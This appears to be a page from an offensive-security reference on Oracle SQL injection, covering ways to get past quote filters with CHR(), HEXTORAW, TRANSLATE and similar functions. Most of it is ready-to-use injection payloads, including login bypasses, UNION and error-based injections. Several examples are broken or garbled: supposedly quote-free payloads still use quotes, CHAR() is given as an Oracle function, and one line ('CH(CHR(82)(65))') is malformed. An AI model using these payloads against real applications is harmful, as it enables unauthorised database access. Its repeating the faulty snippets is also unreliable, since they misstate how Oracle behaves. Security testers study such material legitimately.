---
title: Avoiding Quotations
description: Techniques to bypass quotation filters in Oracle SQL injection
category: Injection Techniques
order: 8
tags: ["filter bypass", "quotation", "string manipulation"]
lastUpdated: 2025-03-15
---

## Avoiding Quotations

When quotation marks are filtered or escaped, standard SQL injection techniques may fail. Oracle provides several methods to work around these limitations and still inject SQL code without using quotes.

### Using Character Functions

Oracle provides several functions to convert between ASCII values and characters:

| Function                     | Description                       | Example                                |
| ---------------------------- | --------------------------------- | -------------------------------------- |
| `CHR()`                      | Converts ASCII value to character | `CHR(39)` produces a single quote `'`  |
| `ASCII()`                    | Converts character to ASCII value | `ASCII('A')` returns `65`              |
| `CONCAT()`                   | Concatenates strings              | `CONCAT('ab','cd')` returns `abcd`     |
| `HEXTORAW()`                 | Converts hex to raw binary        | `HEXTORAW('414243')` converts to `ABC` |
| `UTL_RAW.CAST_TO_VARCHAR2()` | Converts raw data to string       | Converts raw data to VARCHAR2          |

### Basic Quotation Bypasses

```sql
-- Using CHR() function to create strings
SELECT * FROM users WHERE username=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)  -- 'ADMIN'

-- Using concatenation of CHR() values
SELECT * FROM users WHERE username=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)

-- Using decimal ASCII values
SELECT * FROM users WHERE ASCII(username)=65  -- 'A'
```

### SQL Injection Examples

#### Character-by-Character Construction

```sql
-- Injecting without quotes
' OR username=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)--

-- Bypassing login screen
username: admin' --
password: anything' OR 1=1--
```

#### Using CHAR() Function

```sql
-- Alternative to CHR
' OR username=CHAR(65)||CHAR(68)||CHAR(77)||CHAR(73)||CHAR(78)--
```

#### Using Hex Encoding

```sql
-- Using HEXTORAW
' OR username=UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('41444D494E'))--  -- 'ADMIN'
```

### Advanced Techniques

#### Concatenating with DBMS_OBFUSCATION_TOOLKIT

If available (requires privileges):

```sql
-- Using DBMS_OBFUSCATION_TOOLKIT
' OR username=DBMS_OBFUSCATION_TOOLKIT.DESDECRYPT(HEXTORAW('41444D494E'),'key')--
```

#### Using TRANSLATE Function

```sql
-- Using TRANSLATE to build strings without quotes
' OR username=TRANSLATE(CHR(88),CHR(88),CHR(65))||TRANSLATE(CHR(88),CHR(88),CHR(68))||TRANSLATE(CHR(88),CHR(88),CHR(77))||TRANSLATE(CHR(88),CHR(88),CHR(73))||TRANSLATE(CHR(88),CHR(88),CHR(78))--
```

#### Using Date Conversion

```sql
-- Extract strings from dates
' OR username=TO_CHAR(TO_DATE('01-JAN-00','DD-MON-RR'),'YYYY')--  -- Returns '2000'
```

#### Using DUMP and CAST

```sql
-- Using DUMP and CAST functions
' OR username=(SELECT CAST(CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) AS VARCHAR2(5)) FROM dual)--
```

### Table and Column Names Without Quotes

In Oracle, identifiers can be enclosed in double quotes. If both single and double quotes are filtered:

```sql
-- Reference tables using CHR() concatenation
SELECT * FROM user_tables WHERE table_name=CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)  -- 'USERS'

-- Reference columns using CHR() concatenation
SELECT CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(78)||CHR(65)||CHR(77)||CHR(69) FROM users  -- 'USERNAME'
```

### Using Built-in Variables and Constants

```sql
-- Using SYS_CONTEXT to check for values without quotes
' OR SYS_CONTEXT('USERENV','SESSION_USER')=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)--
```

### Bypassing Multi-Layer Filters

Some applications implement multiple layers of filtering:

```sql
-- Double encoding CHR() function
' OR username=CH(CHR(82)(65))||CHR(68)||CHR(77)||CHR(73)||CHR(78)--

-- Using nested functions
' OR username=(SELECT CHR(65||68||77||73||78) FROM dual)--
```

### Practical Considerations

#### Testing for Quote Filtering

Before attempting bypasses, check how the application handles quotes:

```sql
-- Test for single quote filtering
' OR 1=1--

-- Test for escaped quotes
\' OR 1=1--

-- Test for double-quote filtering
" OR 1=1--
```

#### Combining with Other Techniques

Quotation bypasses often work best when combined with other techniques:

```sql
-- Combine with UNION injection
' UNION SELECT CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78),NULL FROM dual--

-- Combine with error-based injection
' AND (SELECT UPPER(CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)) FROM dual)=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)--
```
